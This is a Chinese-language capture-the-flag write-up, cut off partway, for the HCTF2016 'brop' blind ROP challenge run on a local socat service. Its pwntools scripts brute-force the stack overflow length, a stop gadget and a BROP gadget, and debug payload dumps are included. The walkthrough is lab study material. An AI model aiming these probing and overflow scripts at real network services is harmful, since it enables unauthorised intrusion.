# hctf2016_brop
## brop
HCTF2016 的出题人失踪了

没有提供二进制

本地搭建环境，写个脚本跑起来
```
#!/bin/sh
while true; do
        num=`ps -ef | grep "socat" | grep -v "grep" | wc -l`
        if [ $num -lt 5 ]; then
                socat tcp4-listen:10001,reuseaddr,fork exec:./brop &
        fi
done
```

思路总结：

1、确定栈溢出长度

2、找到stop gardget

3、找到brop gardget

4、找到puts@plt

5、dump程序，找到puts@got

6、找到libc版本，然后正常rop套路

### 确定栈溢出长度

```python
from pwn import *

def get_buffer_size():
    i = 0
    while True:
        i += 1
        try:
            p = remote('127.0.0.1', 10001)
            p.readuntil('password?\n')
            p.send('A' * i)
            p.recv()
            p.close()
        except EOFError:
            p.close()
            return i - 1

print get_buffer_size()
```
得到长度72

## 找到stop gardget
```python
buffer_size = 72

def get_stop_gardget(buffer_size):
    addr = 0x400000
    while True:
        try:
            p = remote('127.0.0.1', 10001)
            p.readuntil('password?\n')
            payload = 'A' * buffer_size + p64(addr)
            p.send(payload)
            p.recv()
            p.close()
            print 'stop gardget @ {:#x}'.format(addr)
            return addr
        except EOFError:
            p.close()
            addr += 1

addr = get_stop_gardget(buffer_size)
```
stop gardget @ 0x4005c0

## 找到brop gardget
probe, trap, trap, trap, trap, trap, trap, stop, traps
我们可以通过这样的布局来找到弹出 6 个栈变量的 gadget，也就是与 brop gadget 相似的 gadget。
之所以要在每个布局的后面都放上 trap，是为了能够识别出，当我们的 probe 处对应的地址执行的指令跳过了 stop，程序立马崩溃的行为。

需要注意的是 probe 可能是一个 stop gadget，我们得去检查一下，怎么检查呢？我们只需要让后面所有的内容变为 trap 地址即可。因为如果是 stop gadget 的话，程序会正常执行，否则就会崩溃。看起来似乎很有意思.


```python
stop_gardget = 0x4005c0

def get_brop_garget(buffer_size, stop_gardget):
    addr = 0x400000 - 1
    while True:
        addr += 1
        try:
            p = remote('127.0.0.1', 10001)
            p.readuntil('password?\n')
            payload = 'A' * buffer_size + p64(addr) + p64(0) * 6 + p64(stop_gardget) + p64(0) * 10
            p.send(payload)
            data = p.recv()
            p.close()
            if 'WelCome' in data:
                # check
                try:
                    p = remote('127.0.0.1', 10001)
                    p.readuntil('password?\n')
                    payload = 'A' * buffer_size + p64(addr) + p64(0) * 10
                    p.send(payload)
                    data = p.recv()
                    p.close()
                except EOFError:
                    p.close()
                    print 'brop gardget @ {:#x}'.format(addr)
                    return addr
        except EOFError:
            p.close()
            
get_brop_garget(buffer_size, stop_gardget)
```
会卡住：然后设置从0x400701开始继续，如果卡住再新增，最后设置成从0x400738开始可以跑出
```
[DEBUG] Sent 0xd8 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000040  41 41 41 41  41 41 41 41  00 07 40 00  00 00 00 00  │AAAA│AAAA│··@·│····│
    00000050  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    *
    00000080  c0 05 40 00  00 00 00 00  00 00 00 00  00 00 00 00  │··@·│····│····│····│
    00000090  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    *
    000000d0  00 00 00 00  00 00 00 00                            │····│····│
    000000d8

```
```python
def get_brop_garget(buffer_size, stop_gardget):
    addr = 0x400738 - 1
    ... ... 同上
```
```
brop gardget @ 0x4007ba
```

## 找到puts@plt
